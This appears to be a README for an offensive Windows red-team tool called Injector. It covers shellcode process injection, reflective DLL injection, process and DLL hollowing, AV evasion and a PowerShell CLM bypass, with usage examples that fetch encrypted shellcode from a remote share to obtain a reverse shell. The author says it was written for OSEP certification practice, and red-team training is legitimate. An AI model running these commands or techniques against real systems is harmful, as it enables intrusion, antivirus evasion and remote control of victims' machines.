# Injector
Complete Arsenal of Memory injection and other techniques for red-teaming in Windows

# What does Injector do?

- Process injection support for shellcode located at remote server as well as local storage. Just specify the shellcode file and it will do the rest. It will by default inject into notepad.exe and if not found, it will create a notepad process and inject into it for persistence.
- Reflective DLL Injection for DLL injection. It downloads the DLL and injects into remote process.
- Process hollowing via svchosts.exe
- With -bypass flag it tends to use more advanced un-documented API for process injeciton and the routine itself gets changes.
- Now even supports encrypted shellcode i.e AES encrypted and Xor encryted shellcode are now supported. To encrypt the shellcode use Helper.exe in order to maintain consistency.  
- Supports CLM bypass for powershell. Just drop it to a whitelisted folder where you can execute C# binary, for instance at C:\\Windows\\Tasks
- Now comes with support for DLL Hollowing. DLL hollowing is implemented via the dll_hollow.dll! So in case you end up using this mode, make sure the dll and the exe are in same place.

```
C:\Users\admin>Injector.exe
Help Options for Xenon:
-m       Mode of operation
        -m 1     Specifies the mode as Process injection
        -m 2     Specifies the mode as Reflective DLL Injection
        -m 3     Specifies the mode as Process Hollowing
        -m 4     No injection! Give me my damn shell
        -m 5     Powershell session via CLM bypass
        -m 6     DLL hollowing

-TempFile        File location that your current user can read
-shellcode       Use shellcode
-dll     Use dll
-decrypt-xor     Specify Xor decryption for shellcode
         -pass   Specifty the password for Xor decryption
-decrypt-aes     Specify aes decryption for shellcode
         -pass   Specifty the password for aes decryption
-location        Specify the location i.e either server or local
-bypass         Uses enhance attempts to bypass AV
```
To generate encrypted shellcode, use Helper.exe on kali along with proper switch.

### Example of usage

```
Injector.exe -m=1 -shellcode -encrypt-aes -pass=password -location="\\192.x.x.x\share\shellcode.txt" -bypass
```
This is will decrypt your shellcode and give you reverse shell. Presence of bypass flag instructs injector to use some other ways to get reverse shell i.e using some undocumented Win API.

```
Injector.exe -m=5 -TempFile=C:\\Users\\user\\sample.txt
```
This will give you a session where you can execute IEX cradle and get a proper reverse shell hence bypassing CLM.

# Why make it?

Main aim is to help me in OSEP :P

# Talk to me?

Shoot me a DM on twitter @gh0st_R1d3r_0x9 to talk abt more interesting indeas/modules that can make this more amazing!

Current module in pipeline
- Phantom DLL Injection

# Acknowledgements

[Ired Team](https://www.ired.team/offensive-security/code-injection-process-injection/modulestomping-dll-hollowing-shellcode-injection)
